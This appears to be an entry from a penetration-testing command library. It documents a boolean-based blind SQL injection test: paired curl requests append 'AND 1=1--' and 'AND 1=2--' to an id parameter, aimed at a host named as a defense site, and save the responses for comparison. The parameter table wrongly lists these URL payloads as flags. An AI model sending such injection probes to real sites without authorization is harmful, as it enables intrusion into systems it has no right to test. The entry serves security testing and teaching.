---
id: cmd-uuid-1
name: curl-boolean-test
type: command
executor: bash
data: |-
  curl "https://target-dod-site.com/page?id=1' AND 1=1--" -o response_true.html
  curl "https://target-dod-site.com/page?id=1' AND 1=2--" -o response_false.html
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:15.105Z'
platforms:
  - Linux
  - macOS
tags:
  - sqli
  - testing
verified: false
validated: true
submitted: true
---

# curl-boolean-test

## Command

```bash
curl "https://target-dod-site.com/page?id=1' AND 1=1--" -o response_true.html
curl "https://target-dod-site.com/page?id=1' AND 1=2--" -o response_false.html
```

## Description

This command tests for boolean-based blind SQLi by sending true and false conditions and saving responses for comparison.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--id=1' AND 1=1--` | True condition payload | Yes |
| `--id=1' AND 1=2--` | False condition payload | Yes |
| `-o` | Output file | Yes |

## Examples

### Basic Usage

```bash
curl "https://target.com/page?id=1' AND 1=1--" -o true.html
```

### Advanced Usage

```bash
curl -v "https://target.com/page?id=1' AND 1=2--" -o false.html
```

## Expected Output

Two HTML files: true.html with normal page content, false.html with error or different content.

## Related

- [[Related Procedure]]
